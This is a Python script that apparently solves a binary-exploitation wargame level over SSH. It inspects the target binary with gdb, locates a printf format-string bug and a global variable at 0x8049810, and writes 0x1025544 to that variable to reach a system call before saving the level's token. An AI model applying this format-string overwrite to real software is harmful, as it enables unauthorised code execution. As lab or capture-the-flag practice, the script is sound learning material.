import os
import sys
bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, exec_in_stream, exec_stream, find_buffer_position, get_func_structure
from utils.text import print_output, print_title
from utils.base import save_token, get_rewrite_stack_command

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

stream = exec_stream(f'./{binary_name}', title='Simple execute binary', stdin=True, stdout=True)
print_title('Okay, stdin intercepted, stdin write expected')

output = exec_in_stream(stream, 'test', title='Send test in stdin')
print_output(output, 'Output')
print_title('Our input just printed, oks')
print_title('Debug Time')

func_info = exec(client, f'echo "info func" | gdb ./{binary_name} -q | egrep " p$| main$| n$"', title='Get all functions')
print_output(func_info)
print_title('We have two three entry points')

get_func_structure(client, 'main', title='Call function n (+6)')
get_func_structure(
    client, 'n', title='Read input (+35), call function f (+49), '
                       'load and compare input with m var in global scope (+54 +59), '
                       'if expression passed system call (+64 +73)')
get_func_structure(client, 'p', title='Print via printf (+12)')

m_address = '0x8049810'
cmp_expression = '0x1025544'
buffer_position = find_buffer_position(client)

output = exec(
    client, f"{get_rewrite_stack_command(m_address, cmp_expression, buffer_position, 4)} | "
            f"./{binary_name} | cut -c 16921950-")[0].strip()
print_output(output, 'Output')

save_token(output, client)
